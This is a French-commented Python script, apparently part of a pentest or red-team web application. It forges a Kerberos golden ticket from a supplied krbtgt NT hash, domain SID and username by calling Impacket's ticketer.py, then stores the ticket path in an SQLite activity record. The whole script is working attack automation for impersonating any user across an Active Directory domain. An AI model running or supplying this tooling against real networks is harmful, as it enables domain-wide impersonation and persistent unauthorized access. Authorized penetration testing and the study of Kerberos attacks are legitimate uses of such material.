#importer les bibliothèques
import subprocess
import time
import argparse
import json
import sqlite3
from datetime import datetime
import os

#Les arguments :
#remarque : decommenté les arguments
parser = argparse.ArgumentParser()

parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--nthash_krbtgt', type=str, required=True, help='Le hash NT de compte TRBTGT')
parser.add_argument('--domain_name', type=str, required=True, help='le nom FQDN de domaine')
parser.add_argument('--domain_sid', type=str, required=False, help='Le SID de domaine')
parser.add_argument('--username', type=str, required=True, help='Le username')

args = parser.parse_args()

nthash_krbtgt = args.nthash_krbtgt
domaine_name = args.domain_name
domain_sid = args.domain_sid
username = args.username

# sauvegarde du chemin du repertoire courant
origin_dir_path = os.path.abspath(os.getcwd())

# aller au repertoire dans lequel on stocke les tiquet golden
golden_directory = "My_app/golden_tickets"
os.chdir(golden_directory)

#construction de la commande a lancer avec subprocess

cmd = "../scripts/impacket/examples/ticketer.py -nthash " + nthash_krbtgt + " -domain-sid " + domain_sid + " -domain " + domaine_name + " " + username

# Exécute la commande dans un nouveau processus
process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)

# Attend que la tâche soit terminée et récupère la sortie
output, error = process.communicate()
print('%%%%%%%%%%%%%  sortie de la commande  %%%%%%%%%%%%%')
print(output.decode("utf-8"))

#recuperer le chemin absolu de ticket TGT creer avec le chemin relatif comme parametre (c'est a dire le nom de ticket)
nom_TGT = username + ".ccache"
chemin_absolu_vers_ticket = os.path.abspath(nom_TGT)

# retourner au repertoire d'origine
os.chdir(origin_dir_path)

resultats = {
	'ticket_type' : 'TGT',
	'ticket_path' : chemin_absolu_vers_ticket,
	'ticket_name' : nom_TGT

}

print(json.dumps(resultats, indent=4))


#transformer le dictionnaire en JSON
json_resultats = json.dumps(resultats)


# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :
conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()
